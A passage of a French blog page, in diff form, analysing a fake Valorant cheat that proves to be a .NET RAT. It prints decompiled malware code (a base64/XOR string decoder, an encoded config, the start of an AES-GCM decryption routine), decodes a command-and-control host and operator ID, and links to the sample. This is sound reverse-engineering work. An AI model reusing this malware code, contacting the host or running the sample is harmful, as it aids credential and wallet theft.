@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Malware Analysis d&#39;un Fake Cheat</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Malware&#32;Analysis&#32;d&#39;un&#32;Fake&#32;Cheat />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Malware&#32;Analysis&#32;d&#39;un&#32;Fake&#32;Cheat />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Malware&#32;Analysis&#32;d&#39;un&#32;Fake&#32;Cheat />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Malware&#32;Analysis&#32;d&#39;un&#32;Fake&#32;Cheat />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Voici comment j&#39;ai reverse un malware RAT" />
+<meta itemprop="description" content="Voici comment j&#39;ai reverse un malware RAT" />
+<meta property="og:description" content="Voici comment j&#39;ai reverse un malware RAT" />
+<meta name="twitter:description" content="Voici comment j&#39;ai reverse un malware RAT" />
+
+
+<base href="//localhost:1313/posts/analyse-fake-cheat-valorant/" />
+<link rel="canonical" href="//localhost:1313/posts/analyse-fake-cheat-valorant/" itemprop="url" />
+<meta name="url" content="//localhost:1313/posts/analyse-fake-cheat-valorant/" />
+<meta name="twitter:url" content="//localhost:1313/posts/analyse-fake-cheat-valorant/" />
+<meta property="og:url" content="//localhost:1313/posts/analyse-fake-cheat-valorant/" />
+
+
+<meta property="og:updated_time" content="2021-11-25T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/analyse-fake-cheat-valorant/">Malware Analysis d&#39;un Fake Cheat</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2021-11-25T12:00:00Z" class="post-date">
+        November 25, 2021
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>4 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-reverse">
+        <a href="//localhost:1313/tags/reverse">reverse</a>
+      </li>
+      
+      <li class="tag-virus">
+        <a href="//localhost:1313/tags/virus">virus</a>
+      </li>
+      
+      <li class="tag-.net">
+        <a href="//localhost:1313/tags/.net">.net</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <hr>
+<h2 id="introduction">Introduction</h2>
+<p>Je suis tombé sur ce prétendu Cheat Valorant et j&rsquo;ai décidé de l&rsquo;analyser.
+Voici le fichier : <a href="./files/Do_Not_Execute">ici</a>
+Attention à ne pas l&rsquo;exécuter !</p>
+<h2 id="commencement">Commencement</h2>
+<p>Après avoir téléchargé le .exe, je lui supprime tout de suite son extension <em>.exe</em> pour éviter de le lancer par erreur en cliquant dessus.</p>
+<p>Je lance DetectItEasy et je me rends compte qu&rsquo;il est compilé en .Net</p>
+<p><img src="./img/die.png" alt="All text"></p>
+<p>Je vais donc utiliser <a href="https://github.com/dnSpy/dnSpy" target="_blank">Dnspy</a> pour explorer le code.
+C&rsquo;est un décompiler parfait pour ce langage, bien plus adapté ici que Ghidra ou IDA.</p>
+<h2 id="analyse-des-fonctions">Analyse des fonctions</h2>
+<p>Voici les fonctions présentes :
+<img src="./img/fonctions.png" alt="All text"></p>
+<p>Bon, c&rsquo;est assez évident, mais on voit bien que ce n&rsquo;est pas un cheat, on dirait plutôt un RAT&hellip;</p>
+<p>On a ces fonctions bizarres :</p>
+<ul>
+<li>&ldquo;DownloadAndExecute&rdquo;</li>
+<li>&ldquo;EndConnection&rdquo;</li>
+<li>&ldquo;FileZilla&rdquo;</li>
+<li>&ldquo;AllWallets&rdquo;</li>
+</ul>
+<p><img src="./img/main.png" alt="All text"></p>
+<p>Il y a une connexion TCP à la ligne 40 qui se fait en boucle puis qui attend une tâche à faire en permanence.</p>
+<p>On peut aller voir la fonction : <code>StringDecrypt</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">static</span> string <span style="color:#a6e22e">Read</span>(string b64, string stringKey)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  string result;
+</span></span><span style="display:flex;"><span>  try
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (string.<span style="color:#a6e22e">IsNullOrWhiteSpace</span>(b64))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      result <span style="color:#f92672">=</span> string.Empty;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      result <span style="color:#f92672">=</span> StringDecrypt.<span style="color:#a6e22e">FromBase64</span>(StringDecrypt.<span style="color:#a6e22e">Xor</span>(StringDecrypt.<span style="color:#a6e22e">FromBase64</span>(b64), stringKey));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  catch
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> b64;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>C&rsquo;est juste un décodage de la base64, un xor puis un second décodage en base64</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">static</span> string <span style="color:#a6e22e">Xor</span>(string input, string stringKey)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		StringBuilder stringBuilder <span style="color:#f92672">=</span> new <span style="color:#a6e22e">StringBuilder</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> input.Length; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			stringBuilder.<span style="color:#a6e22e">Append</span>(Convert.<span style="color:#a6e22e">ChangeType</span>((<span style="color:#66d9ef">int</span>)(input[i] <span style="color:#f92672">^</span> stringKey[i <span style="color:#f92672">%</span> stringKey.Length]), TypeCode.Char));
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> stringBuilder.<span style="color:#a6e22e">ToString</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>Si on remonte la clé, on retrouve ce fichier :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">static</span> class Arguments
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	public <span style="color:#66d9ef">static</span> string IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;EgsrCgUlRiA8NkYRFjQNVy0dCUcWIQpVPiBPTg==&#34;</span>;
+</span></span><span style="display:flex;"><span>	public <span style="color:#66d9ef">static</span> string ID <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Gi0jHDglRnsHU0IJEQkOVS83Bk8=&#34;</span>;
+</span></span><span style="display:flex;"><span>	public <span style="color:#66d9ef">static</span> string Message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ESEvGAQ2Hy0rJT4UKDQzFig0OwIRDDAGEQxLQwIiOwUFJUYgLCZKGDs0ehUCQC8CESYGXA==&#34;</span>;
+</span></span><span style="display:flex;"><span>	public <span style="color:#66d9ef">static</span> string Key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Keasars&#34;</span>;
+</span></span><span style="display:flex;"><span>	public <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> Version <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>La clé : <strong>Keasars</strong> nous permet de trouver les autres valeurs des strings :</p>
+<ul>
+<li>Message : &ldquo;d3dx9_43.dll file not found or missing&rdquo;</li>
+<li>Id : &ldquo;@phantomas1448&rdquo;</li>
+<li>IP : &ldquo;brrundanitav.xyz:80&rdquo;</li>
+</ul>
+<p>On peut aller voir dans la class <code>AES</code>
+On voit beaucoup de MemoryStream, ect.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>private byte[] <span style="color:#a6e22e">Get</span>(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  IntPtr intPtr <span style="color:#f92672">=</span> this.<span style="color:#a6e22e">OpenAlgorithmProvider</span>(<span style="color:#e6db74">&#34;AES&#34;</span>, <span style="color:#e6db74">&#34;Microsoft Primitive Provider&#34;</span>, <span style="color:#e6db74">&#34;ChainingModeGCM&#34;</span>);
+</span></span><span style="display:flex;"><span>  IntPtr hKey;
+</span></span><span style="display:flex;"><span>  IntPtr hglobal <span style="color:#f92672">=</span> this.<span style="color:#a6e22e">ImportKey</span>(intPtr, key, out hKey);
+</span></span><span style="display:flex;"><span>  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO <span style="color:#f92672">=</span> new <span style="color:#a6e22e">BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO</span>(iv, aad, authTag);
+</span></span><span style="display:flex;"><span>  byte[] array2;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">using</span> (bcrypt_AUTHENTICATED_CIPHER_MODE_INFO)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    byte[] array <span style="color:#f92672">=</span> new byte[this.<span style="color:#a6e22e">MaxAuthTagSize</span>(intPtr)];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (this.<span style="color:#a6e22e">BCryptDecrypt</span>(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, <span style="color:#ae81ff">0</span>, ref num, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0U</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      throw new <span style="color:#a6e22e">CryptographicException</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    array2 <span style="color:#f92672">=</span> new byte[num];
+</span></span><span style="display:flex;"><span>    uint num2 <span style="color:#f92672">=</span> this.<span style="color:#a6e22e">BCryptDecrypt</span>(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (num2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">3221266434U</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      throw new <span style="color:#a6e22e">CryptographicException</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (num2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0U</span>)
+</span></span><span style="display:flex;"><span>    {
